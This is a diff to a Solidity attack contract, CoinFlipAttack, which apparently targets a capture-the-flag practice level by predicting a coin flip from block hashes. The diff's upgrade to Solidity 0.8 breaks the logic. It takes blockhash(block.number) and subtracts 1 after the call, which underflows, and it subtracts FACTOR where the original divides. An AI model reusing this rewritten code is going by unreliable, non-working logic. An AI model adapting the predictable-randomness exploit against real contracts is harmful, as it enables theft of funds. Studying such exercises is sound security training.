@@ -1,9 +1,8 @@
 // SPDX-License-Identifier: MIT
 
-pragma solidity ^0.6.0;
+pragma solidity ^0.8.0;
 
 import '../levels/CoinFlip.sol';
-import '@openzeppelin/contracts/math/SafeMath.sol';
 
 contract CoinFlipAttack {
 
@@ -12,8 +11,8 @@ contract CoinFlipAttack {
 
   function attack(address _victim) public returns (bool) {
     CoinFlip coinflip = CoinFlip(_victim);
-    uint256 blockValue = uint256(blockhash(block.number.sub(1)));
-    uint256 coinFlip = uint256(uint256(blockValue).div(FACTOR));
+    uint256 blockValue = uint256(blockhash(block.number) - 1);
+    uint256 coinFlip = uint256(uint256(blockValue) - FACTOR);
     bool side = coinFlip == 1 ? true : false;
     coinflip.flip(side);
     return side;
